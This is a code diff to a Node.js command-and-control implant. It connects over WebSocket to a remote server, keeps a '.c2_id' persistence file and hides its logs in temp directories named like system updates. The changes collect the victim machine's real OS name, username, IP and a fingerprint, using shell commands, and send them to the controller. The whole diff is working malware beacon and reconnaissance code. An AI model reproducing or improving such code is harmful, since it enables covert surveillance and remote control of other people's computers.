@@ -12,7 +12,7 @@ const WS_URL = 'wss://server-eight-pi-39.vercel.app';
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
-const HIDDEN_LOG_FILE = path.join(os.tmpdir(), '.sys_cache.log'); // Hidden log for stealth
+const HIDDEN_LOG_FILE = path.join(os.tmpdir(), '.sys_cache.log');
 
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 
@@ -110,17 +110,31 @@ function initConnection() {
  reconnectAttempts = 0;
  isConnected = true;
  log(`[WS] Connected. Sending identity...`);
- // Send info including the unique ID, Serial Number AND Fingerprint
+ 
+ // Get Real OS Name and User
+ let realOsName = os.release(); // e.g., "5.15.0-91-generic"
+ let realUser = os.userInfo().username || 'user';
+ 
+ // Try to get full OS name (e.g., "Debian GNU/Linux 12")
+ try {
+ if (process.platform === 'linux') {
+ const releaseInfo = execSync("cat /etc/os-release | grep 'PRETTY_NAME' | cut -d= -f2 | tr -d '\"'").toString().trim();
+ if (releaseInfo) realOsName = releaseInfo;
+ } else if (process.platform === 'win32') {
+ realOsName = "Windows " + os.release();
+ }
+ } catch(e) {}
+
  safeSend(JSON.stringify({
  type: 'info',
  id: myId,
  uniqueId: myId,
- os: getRealOSName(), // <-- NEW: Get real OS name
+ os: realOsName, // <-- FIXED: Send full OS name
  arch: os.arch(),
- user: os.userInfo().username || 'user',
+ user: realUser, // <-- FIXED: Send real user
  ip: myIp, 
  serialNumber: myId, 
- fingerprint: myId // <-- NEW: Send fingerprint
+ fingerprint: myId 
  }));
  startMonitoring();
  });
@@ -216,38 +230,5 @@ const server = http.createServer((req, res) => {
 
 server.listen(PORT, '0.0.0.0', () => {
  log(`[RENDER] HTTP server listening on 0.0.0.0:${PORT}`);
- initConnection(); // Start WebSocket connection after port is open
+ initConnection();
 });
-
-// --- REAL OS NAME DETECTION ---
-function getRealOSName() {
- if (os.platform() === 'win32') {
- try {
- const release = execSync('wmic os get caption').toString().split('\n')[1].trim();
- return release || 'Windows';
- } catch (e) {
- return 'Windows';
- }
- } else if (os.platform() === 'linux') {
- try {
- // Try to get the distro name from /etc/os-release
- const osRelease = fs.readFileSync('/etc/os-release', 'utf8');
- const match = osRelease.match(/PRETTY_NAME="(.+?)"/);
- if (match && match[1]) {
- return match[1];
- }
- // Fallback to kernel release
- return `Linux ${os.release()}`;
- } catch (e) {
- return `Linux ${os.release()}`;
- }
- } else if (os.platform() === 'darwin') {
- try {
- const version = execSync('sw_vers -productVersion').toString().trim();
- return `macOS ${version}`;
- } catch (e) {
- return 'macOS';
- }
- }
- return os.platform();
-}
